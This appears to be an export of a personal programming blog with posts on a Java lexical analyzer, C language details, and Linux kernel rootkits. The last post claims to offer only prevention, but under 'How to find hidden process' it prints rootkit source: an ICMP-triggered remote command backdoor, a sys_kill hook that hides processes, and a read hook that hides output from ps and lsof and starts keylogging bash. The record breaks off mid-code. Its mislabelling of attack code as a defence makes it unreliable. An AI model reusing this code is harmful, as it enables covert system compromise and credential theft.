[{"title":"Realize lexical analyzer with java!","date":"2017-10-13T09:39:16.429Z","path":"2017/10/13/new 11/","text":"definition:Lexical analyzer function input source program, in accordance with the rules of word decomposition into a series of word symbols. A word is the smallest unit of independence in the language, including keywords, identifiers, operators, delimiters, and constants.(1) The keyword is a fixed identifier defined by the program language. For example, the begin, end, if, while of Pascal are reserved words. These words are usually not used as general identifiers.(2) Identifiers are used to represent various names, such as variable names, array names, process names, and so on.(3) constant constant types are generally integer, real type, Boolean, text and so on.(4) Operators such as +, -, *, / and so on.(5) delimiters such as commas, semicolons, brackets, and so on.Output:Lexical analyzer output word symbols are often expressed as the following binary: (Word type, attribute value of word symbol)The word genre is usually encoded in integers. Identifiers are generally classified as one. Constants should be sorted by type (whole, real, boolean, etc.). Keywords can be treated as a whole. Operators can use a method of one character. The boundary character is generally used as a method. For each word symbol, in addition to giving the category code, the attribute information about the word symbol should also be given. The attribute of a word symbol refers to the characteristic or characteristic of a word symbol The specific implementation detailsThis is my first use Java to do a big profram,I will insisted to write codes about Java!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172package com.sun.net.ssl.internal.ssl;import java.io.BufferedReader; import java.io.FileNotFoundException; import java.io.FileReader; import java.io.IOException; public class shiyan1 &#123;public int zifu; //扫描字符public int zhuangtai;//保留字状态码 public String [] name=new String[]&#123;\"关键字\",\"标识符\",\"常数\",\"关系运算符\",\"运算符\",\"分界符\",\"error\"&#125;; public StringBuffer strToken = new StringBuffer();//存放构成单词符号的字符串 public String [] retainWord = new String[]&#123;\"int\",\"if\",\"else\",\"return\",\"main\",\"void\",\"while\",\"break\"&#125;;//保留字 //判断是否是字母 public boolean IsLetter()&#123; if((zifu&gt;=65 &amp;&amp; zifu &lt;= 90) || (zifu &gt;= 97 &amp;&amp; zifu &lt;=122))&#123; return true; &#125; return false; &#125; //判断是否是数字 public boolean IsDigit()&#123; if(zifu&gt;=48 &amp;&amp; zifu &lt;= 57)&#123; return true; &#125; return false; &#125; //判断是否是空格 public boolean IsBC(int ch)&#123; if(ch == 32)&#123; return true; &#125; return false; &#125; //连接字符 public void Concat(char ch)&#123; strToken.append(ch); &#125; //判断是否是保留字 public int Reserve()&#123; for(int i = 0;i &lt; retainWord.length;i++)&#123; if(strToken.toString().equals(retainWord[i]))&#123; return 1; &#125; &#125; if(strToken.length() != 0)&#123; //String strTaken; for(int m=0;m&lt;strToken.length();m++) &#123; for(int j=1;j&lt;m;j++)&#123; if(strToken.charAt(j)!='0' || strToken.charAt(j)!='1' || strToken.charAt(j)!='2' ||strToken.charAt(j)!='3' || strToken.charAt(j)!='4' || strToken.charAt(j)!='5' || strToken.charAt(j)!='6' || strToken.charAt(j)!='7' || strToken.charAt(j)!='8' || strToken.charAt(j)!='9' ) &#123;return 5; &#125; &#125; if(strToken.charAt(m)&gt;='0' &amp;&amp; strToken.charAt(m)&lt;='9')&#123; return 3; &#125; &#125; //if(strToken.charAt(0)!=IsLetter()) &#125; //if() return 2; &#125; // public void Retract()&#123; zhuangtai = Reserve(); if(zhuangtai == 1)&#123; System.out.println(\"('\"+1+\"','\"+strToken+\"','\"+name[0]+\"')\"); &#125;else if(zhuangtai == 2)&#123; System.out.println(\"('\"+2+\"','\"+strToken+\"','\"+name[1]+\"')\"); &#125; else if(zhuangtai == 3)&#123; System.out.println(\"('\"+3+\"','\"+strToken+\"','\"+name[2]+\"')\"); &#125; else if(zhuangtai == 5)&#123; System.out.println(\"('\"+6+\"','\"+strToken+\"','\"+name[6]+\"')\"); &#125; strToken.delete(0, strToken.length()); &#125; /** * 读取文件 */ public void scanner()&#123; BufferedReader br; try &#123; br = new BufferedReader(new FileReader(\"C:/Users/Administrator/Desktop/rootkid/xx.txt\")); while((zifu = br.read()) != -1)&#123; if(IsBC(zifu) == false)&#123; if(IsLetter())&#123; if(IsLetter() == true || IsDigit() == true)&#123; Concat((char)zifu); &#125; &#125;else if(IsDigit() == true)&#123; Concat((char)zifu); &#125;else if(IsDigit())&#123; Concat( (char)zifu); &#125;else if(zifu == 61)&#123; if((strToken.length() != 0 )&amp;&amp; (strToken.charAt(0) == '='))&#123; strToken.append((char)zifu); System.out.println(\"('\"+4+\"','\"+strToken+\"','\"+name[3]+\"')\"); strToken.delete(0, strToken.length()); &#125;else&#123; strToken.append((char)zifu); &#125; &#125;else if(zifu == 43)&#123; Retract(); System.out.println(\"('\"+4+\"','\"+ (char)zifu+\"','\"+name[4]+\"')\"); &#125;else if(zifu == 45)&#123; Retract(); System.out.println(\"('\"+4+\"','\"+ (char)zifu+\"','\"+name[4]+\"')\"); &#125;else if(zifu == 42)&#123; Retract(); System.out.println(\"('\"+4+\"','\"+ (char)zifu+\"','\"+name[4]+\"')\"); &#125;else if(zifu == 47)&#123; Retract(); System.out.println(\"('\"+4+\"','\"+ (char)zifu+\"','\"+name[4]+\"')\"); &#125;else if((char) zifu == ';')&#123; Retract(); System.out.println(\"('\"+5+\"','\"+ (char)zifu+\"','\"+name[5]+\"')\"); &#125;else if((char) zifu == '(')&#123; Retract(); System.out.println(\"('\"+5+\"','\"+ (char)zifu+\"','\"+name[5]+\"')\"); &#125;else if((char) zifu == ')')&#123; Retract(); System.out.println(\"('\"+5+\"','\"+ (char)zifu+\"','\"+name[5]+\"')\"); &#125;else if((char) zifu == '&#123;')&#123; Retract(); System.out.println(\"('\"+5+\"','\"+ (char)zifu+\"','\"+name[5]+\"')\"); &#125;else if((char) zifu == '&#125;')&#123; Retract(); System.out.println(\"('\"+5+\"','\"+ (char)zifu+\"','\"+name[5]+\"')\"); &#125;else if((char) zifu == ',')&#123; Retract(); System.out.println(\"('\"+5+\"','\"+ (char)zifu+\"','\"+name[5]+\"')\"); &#125; //else if(zifu)&#123;&#125; &#125;else&#123; Retract(); &#125; &#125; &#125; catch (FileNotFoundException e1) &#123; // TODO Auto-generated scatch block e1.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; shiyan1 compile2 = new shiyan1(); compile2.scanner(); &#125; &#125;","tags":[]},{"title":"Something you don't know about C !","date":"2017-10-09T16:27:53.094Z","path":"2017/10/10/new 10/","text":"为了六级，以前写的内容坚持用英语写，不懂得就google翻译帮助&gt;_&lt;,但是这次如果使用英语的话以后看起来应该会很难受所以就用中文写了！C语言的细节肯定不会只有这么多，但是这几个出现的比较频繁，而且在C语言中也是很重要的几个语言特征。如果把这几个细节彻底弄清楚了，C语言本身的神秘就不会太多了。C 语言本身就像一把异常锋利的剪刀，你可以用它做出非常精致优雅的艺术品，也可以剪出一些乱七八糟的废纸片。能够将一件武器用到出神入化那是需要时间的，需要多长时间？不多，请你拿出一万个小时来，英国Exter大学心理学教授麦克.侯威专门研究神童和天才，他的结论很有意思：“一般人以为天才是自然而生、流畅而不受阻的闪亮才华，其实，天才也必须耗费至少十年光阴来学习他们的特殊技能，绝无例外。要成为专家，需要拥有顽固的个性和坚持的能力……每一行的专业人士，都投注大量心血，培养自己的专业才能。”注：台湾女作家、电视节目主持人吴淡如《拿出一万个小时来》。《读者》2003.1期。“不用太努力，只要持续下去。想拥有一辈子的专长或兴趣，就像一个人跑马拉松赛一样，最重要的是跑完，而不是前头跑得有多快。” 准备好了吗？我们开始吧&gt;_&lt;类型的识别。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int fun(char,double)函数定义如下：int(*pf)(char,double)pf=&amp;funC语言的简写：pf=funpf(a,8.9)函数调用时的实际操作int a[6]数组的定义如下：int (*pf)[6]pf=&amp;aint i=(*pf)[2]//将a[2]的值赋给i有了上面的基础我们可以解释下面的定义int* (*a[5])(int, char*); //＃1 void (*b[10]) (void (*)()); //＃2 doube(*)() (*pa)[9]; //＃3 首先是#1：*a[5]是一个五个元素的指针，指针指向函数（int,char*）而这个函数的返回值类型是int型的再次就是#2：*b[10]是一个元素个数为10的数组，每个元素都是一个指针该指针指向一个函数，类型为（void(*)()）【注1】返回值是void型的注1;这个参数有事一个指针，指向一个函数，函数参数为空，返回值void型的最后是#3：pa是一个指针，指针指向一个数组，这个数组有9个元素每个元素都是double(*)()【注2】型的注2：也即是一个指针，指向一个函数函数参数为空，返回值是double现在是不是觉得要认识它们是易如反掌，工欲善其事，必先利其器！我们对这种表达方式熟悉之后，就可以用“typedef”来简化这种类型声明。 ＃1：int* (*a[5])(int, char*); typedef int* (*PF)(int, char*);//PF是一个类型别名【注3】。 PF a[5];//跟int* (*a[5])(int, char*);的效果一样！ 注 3：很多初学者只知道typedef char* pchar；但是对于typedef的其它用法不太了解。Stephen Blaha对typedef用法做过一个总结：“建立一个类型别名的方法很简单，在传统的变量声明表达式里用类型名替代变量名，然后把关键字 typedef加在该语句的开头”。 ＃2：void (*b[10]) (void (*)()); typedef void (*pfv)(); typedef void (*pf_taking_pfv)(pfv); pf_taking_pfv b[10]; //跟void (*b[10]) (void (*)());的效果一样！ ＃3. doube(*)() (*pa)[9]; typedef double(*PF)(); typedef PF (*PA)[9]; PA pa; //跟doube(*)() (*pa)[9];的效果一样！ 3.const和volatile在类型声明中的位置 在这里我只说const，volatile是一样的【注4】！ 注4：顾名思义，volatile修饰的量就是很容易变化，不稳定的量'它可能被其它线程，操作系统，硬件等等在未知的时间改变，所以它被存储在内存中，每次取用它的时候都只能在内存中去读取，它不能被编译器优化放在内部寄存器中。 类型声明中const用来修饰一个常量，我们一般这样使用：const在前面 const int；//int是const const char*;//char是const char* const;//*（指针）是const const char* const;//char和*都是const 对初学者，const char*;和 char* const;是容易混淆的。这需要时间的历练让你习惯它。 上面的声明有一个对等的写法：const在后面 int const；//int是const char const*;//char是const char* const;//*（指针）是const char const* const;//char和*都是const 第一次你可能不会习惯，但新事物如果是好的，我们为什么要拒绝它呢？：）const在后面有两个好处： A． const所修饰的类型是正好在它前面的那一个。如果这个好处还不能让你动心的话，那请看下一个！ B．我们很多时候会用到typedef的类型别名定义。比如typedef char* pchar，如果用const来修饰的话，当const在前面的时候，就是const pchar，你会以为它就是const char* ，但是你错了，它的真实含义是char* const。是不是让你大吃一惊！但如果你采用const在后面的写法，意义就怎么也不会变，不信你试试！ 不过，在真实项目中的命名一致性更重要。你应该在两种情况下都能适应，并能自如的转换，公司习惯，商业利润不论在什么时候都应该优先考虑！不过在开始一个新项目的时候，你可以考虑优先使用const在后面的习惯用法。 指针12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091它的本质是地址的类型。在许多语言中根本就没有这个概念。但是它却正是C灵活，高效，在面向过程的时代所向披靡的原因所在。因为C的内存模型基本上对应了现在von Neumann（冯·诺伊曼）计算机的机器模型，很好的达到了对机器的映射。不过有些人似乎永远也不能理解指针【注5】。 注5：Joel Spolsky就是这样认为的，他认为对指针的理解是一种aptitude，不是通过训练就可以达到的 指针可以指向值、数组、函数，当然它也可以作为值使用。 看下面的几个例子： int* p;//p是一个指针，指向一个整数 int** p;//p是一个指针，它指向第二个指针，然后指向一个整数 int (*pa)[3];//pa是一个指针，指向一个拥有3个整数的数组 int (*pf)();//pf是一个指向函数的指针，这个函数返回一个整数 后面第四节我会详细讲解标识符（identifier）类型的识别。 1.指针本身的类型是什么？ 先看下面的例子：int a;//a的类型是什么？ 对，把a去掉就可以了。因此上面的4个声明语句中的指针本身的类型为： int* int** int (*)[3] int (*)() 它们都是复合类型，也就是类型与类型结合而成的类型。意义分别如下： point to int（指向一个整数的指针） pointer to pointer to int（指向一个指向整数的指针的指针） pointer to array of 3 ints（指向一个拥有三个整数的数组的指针） pointer to function of parameter is void and return value is int （指向一个函数的指针，这个函数参数为空，返回值为整数） 2.指针所指物的类型是什么？ 很简单，指针本身的类型去掉 “*”号就可以了，分别如下： int int* int ()[3] int ()() 3和4有点怪，不是吗？请擦亮你的眼睛，在那个用来把“*”号包住的“()”是多余的，所以： int ()[3]就是int [3]（一个拥有三个整数的数组） int ()()就是int ()（一个函数，参数为空，返回值为整数）【注6】 注6：一个小小的提醒，第二个“()”是一个运算符，名字叫函数调用运算符（function call operator）。 3.指针的算术运算。 请再次记住：指针不是一个简单的类型，它是一个和指针所指物的类型复合的类型。因此，它的算术运算与之（指针所指物的类型）密切相关。 int a[8]; int* p = a; int* q = p + 3; p++; 指针的加减并不是指针本身的表示加减，要记住，指针是一个元素的地址，它每加一次，就指向下一个元素。所以： int* q = p + 3;//q指向从p开始的第三个整数。 p++;//p指向下一个整数。 double* pd; ……//某些计算之后 double* pother = pd – 2;//pother指向从pd倒数第二个double数。 4.指针本身的大小。 在一个现代典型的32位机器上【注7】，机器的内存模型大概是这样的，想象一下，内存空间就像一个连续的房间群。每一个房间的大小是一个字节（一般是黑客动画吧8位）。有些东西大小是一个字节（比如char），一个房间就把它给安置了；但有些东西大小是几个字节（比如double就是8个字节，int就是4 个字节，我说的是典型的32位），所以它就需要几个房间才能安置。 注7：什么叫32位？就是机器CPU一次处理的数据宽度是32位，机器的寄存器容量是32位，机器的数据，内存地址总线是32位。当然还有一些细节，但大致就是这样。16位，64位，128位可以以此类推。 这些房间都应该有编号（也就是地址），32位的机器内存地址空间当然也是32位，所以房间的每一个编号都用32位的数来编码【注8】。请记住指针也可以作为值使用，作为值的时候，它也必须被安置在房间中（存储在内存中），那么指向一个值的指针需要一个地址大小来存储，即32位，4个字节，4个房间来存储。 注8：在我们平常用到的32位机器上，绝少有将32位真实内存地址空间全用完的（232 ＝ 4G），即使是服务器也不例外。现代的操作系统一般会实现32位的虚拟地址空间，这样可以方便运用程序的编制。关于虚拟地址（线性地址）和真实地址的区别以及实现，可以参考《Linux源代码情景分析》的第二章存储管理，在互联网上关于这个主题的文章汗牛充栋，，指向对象成员的指针的大小没有定值，但都是4的倍数。不同的编译器还有不同的值。对于一般的普通类（class），指向对象成员的指针大小一般为4，但在引入多重虚拟继承以及虚拟函数的时候，指向对象成员的指针会增大，不论是指向成员数据，还是成员函数。【注9】。 注9：在Andrei Alexandrescu的《Modern C++ Design》的5.13节Page124中提到，成员函数指针实际上是带标记的（tagged）unions，它们可以对付多重虚拟继承以及虚拟函数，书上说成员函数指针大小是16，但我的实践告诉我这个结果不对，而且具体编译器实现也不同。一直很想看看GCC的源代码，但由于旁骛太多，而且心不静，本身难度也比较高（这个倒是不害怕^_^），只有留待以后了。 还有一点，对一个类的static member来说，指向它的指针只是普通的函数指针，不是pointer to class member，所以它的大小是4。 5.指针运算符&amp;和* 它们是一对相反的操作，&amp;取得一个东西的地址（也就是指针），*得到一个地址里放的东西。这个东西可以是值（对象）、函数、数组、类成员（class member）。 其实很简单，房间里面居住着一个人，&amp;操作只能针对人，取得房间号码； *操作只能针对房间，取得房间里的人。 参照指针本身的类型以及指针所指物的类型很好理解。 小结：其实你只要真正理解了1，2，就相当于掌握了指针的牛鼻子。后面的就不难了，指针的各种变化和C语言中其它普通类型的变化都差不多(比如各种转型)。 参数可变的函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115C语言中有一种很奇怪的参数“…”，它主要用在引数（argument）个数不定的函数中，最常见的就是printf函数。 printf(“Enjoy yourself everyday!\\n”); printf(“The value is %d!\\n”, value); …… 你想过它是怎么实现的吗？ 1. printf为什么叫printf？ 不管是看什么，我总是一个喜欢刨根问底的人，对事物的源有一种特殊的癖好，一段典故，一个成语，一句行话，我最喜欢的就是找到它的来历，和当时的意境，一个外文翻译过来的术语，最低要求我会尽力去找到它原本的外文术语。特别是一个字的命名来历，我一向是非常在意的，中国有句古话：“名不正，则言不顺。 ”printf中的f就是format的意思，即按格式打印【注10】。 注10：其实还有很多函数，很多变量，很多命名在各种语言中都是非常讲究的，你如果细心观察追溯，一定有很多乐趣和满足，比如哈希表为什么叫hashtable而不叫hashlist？在C++的SGI STL实现中有一个专门用于递增的函数iota（不是itoa），为什么叫这个奇怪的名字，你想过吗？ 看文章我不喜欢意犹未尽，己所不欲，勿施于人，所以我把这两个答案告诉你： （1）table与list做为表讲的区别： table: -------|--------------------|------- item1 | kadkglasgaldfgl | jkdsfh -------|--------------------|------- item2 | kjdszhahlka | xcvz -------|--------------------|------- list: **** *** ******* ***** That's the difference！ 如果你还是不明白，可以去看一下hash是如何实现的！ （2）The name iota is taken from the programming language APL. 而APL语言主要是做数学计算的，在数学中有很多公式会借用希腊字母， 希腊字母表中有这样一个字母，大写为Ι，小写为ι， 它的英文拼写正好是iota，这个字母在θ(theta)和κ(kappa)之间！ 下面有一段是这样的: APL is renowned for using a set of non-ASCII symbols that are an extension of traditional arithmetic and algebraic notation. These cryptic symbols, some have joked, make it possible to construct an entire air traffic control system in two lines of code. Because of its condensed nature and non-standard characters, APL has sometimes been termed a \"write-only language\", and reading an APL program can feel like decoding an alien tongue. Because of the unusual character-set, many programmers used special APL keyboards in the production of APL code. Nowadays there are various ways to write APL code using only ASCII characters. 在C++中有函数重载（overload）可以用来区别不同函数参数的调用，但它还是不能表示任意数量的函数参数。 在标准C语言中定义了一个头文件专门用来对付可变参数列表，它包含了一组宏，和一个va_list的typedef声明。一个典型实现如下【注11】： typedef char* va_list; #define va_start(list) list = (char*)&amp;va_alist #define va_end(list) #define va_arg(list, mode) ((mode*) (list += sizeof(mode)))[-1] 注11：你可以查看C99标准7.15节获得详细而权威的说明。也可以参考《C陷阱与缺陷》的附录A。 ANSI C还提供了vprintf函数，它和对应的printf函数行为方式上完全相同，只不过用va_list替换了格式字符串后的参数序列。至于它是如何实现的，你在认真读完《The C Programming Language》后，我相信你一定可以do it yourself！ 使用这些工具，我们就可以实现自己的可变参数函数，比如实现一个系统化的错误处理函数error。它和printf函数的使用差不多。只不过将stream重新定向到stderr。在这里我借鉴了《C陷阱与缺陷》的附录A的例子。 实现如下： #include #include void error(char* format, …) &#123; va_list ap; va_start(ap, format); fprintf(stderr, “error: “); vfprintf(stderr, format, ap); va_end(ap); fprintf(stderr, “\\n”); exit(1); &#125; 你还可以自己实现printf： #include int printf(char* format, …) &#123; va_list ap; va_start(ap, format); int n = vprintf(format, ap); va_end(ap); return n; &#125; 我还专门找到了VC7.1的头文件看了一下，发现各个宏的具体实现还是有区别的，跟很多预处理（preprocessor）相关。其中va_list就不一定是char*的别名。 typedef struct &#123; char *a0; /* pointer to first homed integer argument */ int offset; /* byte offset of next parameter */ &#125; va_list; 其它的定义类似。 经常在Windows进行系统编程的人一定知道函数调用有好几种不同的形式，比如__stdcall，__pascal，__cdecl。在Windows下_stdcall，__pascal是一样的，所以我只说一下__stdcall和__cdecl的区别。 （1）__stdcall表示被调用端自身负责函数引数的压栈和出栈。函数参数个数一定的函数都是这种调用形式。 例如：int fun(char c, double d)，我们在main函数中使用它，这个函数就只管本身函数体的运行，参数怎么来的，怎么去的，它一概不管。自然有main负责。不过，不同的编译器的实现可能将参数从右向左压栈，也可能从左向右压栈，这个顺序我们是不能加于利用的【注12】。 注12：你可以在Herb Sutter的《More Exceptional C++》中的条款20：An Unmanaged Pointer Problem, Part 1:Parameter Evaluation找到相关的细节论述。 （2）__cdecl表示调用端负责被调用端引数的压栈和出栈。参数可变的函数采用的是这种调用形式。 为什么这种函数要采用不同于前面的调用形式呢？那是因为__stdcall调用形式对它没有作用，被调用端根本就无法知道调用端的引数个数，它怎么可能正确工作？所以这种调用方式是必须的，不过由于参数参数可变的函数本身不多，所以用的地方比较少。 对于这两种方式，你可以编制一些简单的程序，然后反汇编，在汇编代码下面你就可以看到实际的区别，很好理解的！ 重载函数有很多匹配（match）规则调用。参数为“…”的函数是匹配最低的，这一点在Andrei Alexandrescu的惊才绝艳之作《Modern C++ Design》中就有用到，参看编译期间侦测可转换性和继承性”。 参考自: click here","tags":[]},{"title":"Rootkid Summary","date":"2017-10-06T15:15:11.335Z","path":"2017/10/06/new 9/","text":"Intermittent learning process do not understand slowly learn a lot, although for Rootkid it is only worth mentioning the fur content but for me still do not know progress, after all, many things can not be achieved overnight, Only after stepping on a variety of pit you will slowly comprehend some things, and later summed up some truth (only for me), learning is a gradual process, can not be the slightest irritability, if you are anxious, then You have lost from the beginning, you just started learning the process, will certainly run into a wall, which is beyond doubt, and you need to do is ask more experienced seniors or teachers, which will make you less Take a lot of detours! For exampleRootkit’s main categories:1234Application level -&gt; Kernel level -&gt; Hardware levelEarly rootkit mainly for the application-level rootkit, application-level rootkit mainly by replacing the login, ps, ls, netstat and other system tools, or modify. Rhosts and other system configuration files to achieve hidden and backdoor; hardware rootkit mainly refers to bios rootkit, Before the system gets control, by writing to the disk file, and then by the bootloader to load the file to regain control, you can also use the virtual machine technology, so that the entire operating system running in the rootkit grasp; the most common rootkit Is kernel-level rootkit.Kernel-level rootkit can be divided into lkm rootkit, non-lkm rootkit. lkm rootkit is based on lkm technology, through the interface provided by the system to load into the kernel space, as part of the kernel, and then through the hook system calls and other technologies to achieve hidden, backdoor function. Non-lkm rootkit mainly refers to the system does not support the lkm mechanism to modify the kernel of a method, mainly through / dev / mem, / dev / kmem equipment directly to the memory, so that the kernel to modify.Non-lkm rootkit To achieve the kernel changes, the first need to get kernel space memory, it is necessary to call kmalloc allocation of memory, and kmalloc is the kernel space call, can not directly call the user space in the function, so think of the call through int 0x80 Function of the method. First select an unusual system call number, find the item in sys_call_table, by writing / dev / mem directly modify it to kmalloc function address, so that when we call the user space in the user space, you can int 0x80 Into the kernel space, the implementation of kmalloc function to allocate memory, and the allocation of the memory address from the eax register to return, so we get a kernel address space memory, and then the function will be written to the memory hack, and again modify the system call table , You can achieve hook function call function Common features of rootkit:123456789101112131415Hidden files: through strace ls can be found ls command is through sys_getdents64 get the file directory, so you can modify the sys_getdents64 system call or the bottom of the readdir to achieve hidden files and directories, as well as ext2 file system directly to modify the method, but It is not easy to implement, there are some specific restrictions.Hidden process: hidden process and hidden files similar to the ps command is to read / proc file system under the process directory to obtain process information, as long as you can hide the / proc file system under the process directory can achieve the effect of hidden process, Ie hook sys_getdents64 and readdir.Hide the connection: netstat command is by reading / proc file system under the net / tcp and net / udp file to obtain the current connection information, so you can hook sys_read call to achieve a hidden connection, you can modify tcp4_seq_show and udp4_seq_show and other functions.Hide the module: lsmod command is mainly through the sys_query_module system call to obtain the module information, you can call the hook sys_query_module system to hide the module, you can also remove the module from the kernel module list to achieve the hidden effect.Sniffer: sniffer can directly access library libpcap link layer, intercepted data packets, packets may be intercepted at the point of hook by the IP layer of linux netfilter framework. Sniffer to obtain other data packets on the network need to set the network card to the promiscuous mode, which is through the ioctl system call SIOCSIFFLAGS order to see the current mode of the network card is through the SIOCGIFFLAGS order, so you can hide the network through the hook sys_ioctl mixed mode.Record password: password records can be achieved by hook sys_read call system, such as through a process to determine the name of the currently running the current terminal is closed or echo, the user can obtain the password. hook sys_read can also implement other functions such as login back door.Erase log: log traditional unix predominantly at / var / log / messages, / var / log / lastlog, / var / run / utmp, / var / log / wtmp, can be prepared by appropriate modification tool log file , You can also change the environment such as HISTFILE / dev / null to hide some of the user's operating information.Core back door: can be the local backdoor and the network to monitor the back door, the local right to mention the kernel module can be sent through the custom command to achieve, the network kernel back door can be in the IP layer to enter the host data packet monitoring, found matching designation After the packet immediately start the connection process. Rootkit’s main technology:123456789101112131415lkm injection, module removal, interruption interrupt (0x80, 0x01), hijacking system call, run-time patch, inline hook, port bounce ...lkm injection: is also a way to hide the kernel module, through the infection system lkm, without affecting the original function of the rootkit module will be linked to the system lkm, the module is running control, after the call system lkm Initialization function, lkm injection involves elf file format and module loading mechanism.Module removal: mainly refers to the module from the module list to remove the module to hide the method, the latest module is always loaded in the module list header, so you can load the rootkit module and then load a cleanup module will rootkit module information from Delete the list, and then exit the module, the new version of the kernel can also determine the module information directly after the list_del.Interception interruption: mainly through the sidt instruction to obtain the address of the interrupt call table, and then access to the interrupt handler entry address, modify the corresponding interrupt handler, such as int 0x80, int 0x1 and so on. Which intercept int 0x1 is a relatively new technology, the main use of the system debugging mechanism, by setting the DR register to intercept the memory address up and down the breakpoint, which in the implementation of the specified instruction into the 0x1 interrupt handler, by modifying 0x1 interrupt Of the processing program can achieve the desired function.Hijacking system call: and intercept interrupt similar, but mainly on the system call table to modify, you can directly replace the original system call table, you can also modify the system call table entry address. Before the 2.4 kernel, the kernel's system call table address is exported, so it can be modified directly. But in the 2.6 kernel, the system call table address is no longer exported, the need to 0x80 interrupt handler to obtain the system call table to obtain the address.Run-time patch: character device driver and block device driver will load the system to register a Struct file_operations structure to achieve the specified read, write and other operations, the file system is the case, by modifying the file system file_operations structure, you can achieve the new read, write operation and so on.inline hook: mainly refers to the kernel function in memory directly modify, without affecting the original function, you can use the jump method, you can also modify the call to the lower function implementation.Port bounce: mainly in order to better break through the firewall restrictions, you can monitor the client port 80, and the server through the client's port 80 back, disguised as a visit to the normal process of web services to break through the firewall limit.","tags":[]},{"title":"Vita","date":"2017-09-27T20:39:48.500Z","path":"2017/09/28/new 8/","text":"The OS summary!The OS summary!The OS summary!The OS summary! The OS summaryThis is a bolg that can make you know more about OS1Too much details,so finally I give a link that I find from CSDN! More info: Click here","tags":[]},{"title":"The study of how to solve rookitd record!","date":"2017-09-23T10:52:34.421Z","path":"2017/09/23/new7/","text":"First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]Then define a filldir hook () function (ps: first, vfs_readir callback function (exact should be called filldir_t filler);Second, sys_getdents is passed to the callback function of vfs_readdir.filldir_t filler is in the various vfs_readir internal callback, by the various fs internal read_dir implementation to complete the directory traversal operation,For each file or subdirectory traversed, callback filler to fill buf) hook the process callback function fill value, when the fill value is equal to the hiddenThe process number of the stored process (ps: the process character name is converted to a corresponding integer by the kstrtouint () function).prefix [MAX_PREFIX].Finally, in the need to hide the main function of the process in order to scan prefix [MAX_PREFIX], when the scan is not 0 when the value of the process is that weNeed to hide the process, return directly, do not return to the buffer. If it is 0, then we do not need to hide the process is not necessary to hidePossession of the process, to the real filldir fill in the buffer. Ps: Since the process is always created by the parent process, and the child process can create a child process, so the process is a tree, and rootkid through the hook functionMake the rootkid want to hide the process by the system call readir function callback function does not return to the process buffer, in fact, is a broken treeBad, making the real system process tree becomes incomplete because someone will use this way to attack the others ,I only give the Prevention method to who is interested in this!!! The first situationHow to find hidden process123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105/* execute cmds hidden in icmp echo packet */unsigned int icmp_hook(#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(3,13,0) unsigned int hooknum,#else const struct nf_hook_ops *ops,#endif struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))&#123; struct icmphdr *icmph; struct iphdr *iph; char *data, *cmd; int cmdlen, passlen; icmph = icmp_hdr(skb); data = (char *)icmph + 8; if (icmph &amp;&amp; icmph-&gt;type == ICMP_ECHO &amp;&amp; !strncmp(rce_pass, data, passlen=strlen(rce_pass))) &#123; /* get ip header */ iph = ip_hdr(skb); /* calculate cmd length */ cmdlen = __be16_to_cpu(iph-&gt;tot_len) - iph-&gt;ihl * 4 - /*icmp header*/ 8 - passlen - /*space after password*/ 1; FDEBUG(\"total len: %d\\theader len: %d\\tpasslen: %d\\n\", __be16_to_cpu(iph-&gt;tot_len), iph-&gt;ihl, passlen); /* get cmd string */ cmd = rce_cmd; memcpy(cmd, data+passlen+1, cmdlen); cmd[cmdlen] = '\\0'; argv[2] = cmd; FDEBUG(\"Cmd (%d bytes): %s\\n\", cmdlen, cmd); /* start userspace command */ call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT); goto drop; &#125; return NF_ACCEPT;drop: return NF_DROP;&#125;/* netfilter hook struct */struct nf_hook_ops nfhook = &#123; .owner = THIS_MODULE, .hook = icmp_hook, .pf = PF_INET, .hooknum = NF_INET_LOCAL_IN, .priority = NF_IP_PRI_FIRST,&#125;;int rce_init(void)&#123; return nf_register_hook(&amp;nfhook);&#125;void rce_exit(void)&#123; nf_unregister_hook(&amp;nfhook);&#125;/*********************** * rootkit control ***********************//* kill hook */asmlinkage long sys_kill(pid_t pid, int sig)&#123; switch (sig) &#123; case SIGRTMAX: /* rootkit control */ switch (pid) &#123; case 0: file_hide_start(); break; case 1: file_hide_stop(); break; &#125; break; case SIGRTMAX-1: /* hide process */ if (pid == 0) reveal_all_pids(); else hide_pid(pid); break; default: return ((asmlinkage long (*)(pid_t, int))old_kill)(pid, sig); &#125; return 0;&#125; Welcome to communicate: Server The second situationChange the system’ps and pstree!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231inkage int h4x_read(unsigned int fd, char __user *buf, size_t count)&#123; int i,r; char date_time[24]; char *kbuf=(char*)kmalloc(256,GFP_KERNEL); /*If output is redirected to file or grep, hide it*/ copy_from_user(kbuf,buf,255); if ((strstr(current-&gt;comm,\"ps\"))||(strstr(current-&gt;comm,\"pstree\"))|| (strstr(current-&gt;comm,\"top\"))||(strstr(current-&gt;comm,\"lsof\")))&#123; if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)) &#123; kfree(kbuf); return -ENOENT; &#125; &#125; r=o_read(fd,buf,count); /*Due to stability issue, we limit the keylogging process*/ if((strcmp(current-&gt;comm,\"bash\") == 0) || 